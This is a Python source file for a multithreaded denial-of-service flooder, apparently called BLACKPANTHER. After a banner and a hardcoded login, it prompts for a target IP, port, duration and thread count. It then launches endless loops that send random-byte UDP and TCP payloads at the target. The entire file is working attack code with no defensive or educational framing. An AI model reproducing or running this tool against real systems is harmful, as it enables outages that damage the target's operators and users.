# -*- coding: utf-8 -*-
import random
import socket
import threading
import os
import sys
import time
import fade
os.system("clear")

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ZA1 = '\033[31m'
    ZA2 = '\033[32m'
    ZA3 = '\033[33m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ZH = '\033[97m'


attemps = 0
os.system("clear")
print("")
print("\033[95m        @ @ @ @ @    @     @ @ @ @ @ @ @    @ @ @  @       @  \033[0m")
print("\033[95m        @         @  @      @         @   @        @     @    \033[0m")
print("\033[94m        @         @  @       @       @   @         @   @      \033[0m")
print("\033[94m        @ @ @ @ @    @        @     @    @         @ @        \033[0m")
print("\033[31m        @         @  @         @   @     @         @   @      \033[0m")   
print("\033[94m        @         @  @          @ @       @        @     @    \033[0m")
print("\033[94m        @ @ @ @ @    @ @ @ @ @   @          @ @ @  @       @  \033[0m")
print("")     
print("\033[91m        @ @ @      @ @    @     @  @ @ @ @  @ @ @ @  @ @ @    \033[0m")
print("\033[91m              @  @     @  @ @   @     @     @        @     @  \033[0m")
print("\033[93m        @ @ @    @ @ @ @  @   @ @     @     @ @ @    @ @ @    \033[0m")
print("\033[93m        @        @     @  @     @     @     @ @ @ @  @     @  \033[0m")
print("")
print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—\033[0m")
print("\033[94m                                                                ||\033[0m")
while attemps < 100:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == 'n0lk0ma' and password == 'n0lk0ma':
        print('You have successfully logged in Welcome to BLACKPANTHER!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue


ip = str(input("\033[94mTarget IP :  \033[0m"))
port = int(input("\033[97mTarget Port :  \033[0m"))
choice = str(input("\033[31m(y/n) :  \033[0m"))
times = int(input("\033[96mTime : \033[0m"))
threads = int(input("\033[92mThreads :  \033[0m"))


def run():
	data = random._urandom(1024)
	i = random.choice(("[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +  "\033[94mRequest Attack  :. " +ip+ " \033[0m")
		except:
			print("[!] Error!")

def run2():
	data = random._urandom(999)
	i = random.choice(("[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +  "\033[31mStart Attack ::.." +ip+ " \033[0m")
		except:
			s.close()
			print("[+] Error!")
            

def run3():
	data = random._urandom(818)
	i = random.choice(("[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +  "\033[92mStatus Sent :::..." +ip+ " \033[0m")
		except:
			s.close()
			print("[*] Error!")
            
  
def run4():
	data = random._urandom(16)
	i = random.choice(("[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +  "\033[91mRequest Sent  ::::....  " +ip+ " \033[0m")
		except:
			s.close()
			print("[+] Error!")
											
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
else:
		th = threading.Thread(target = run4)
		th.start()



     
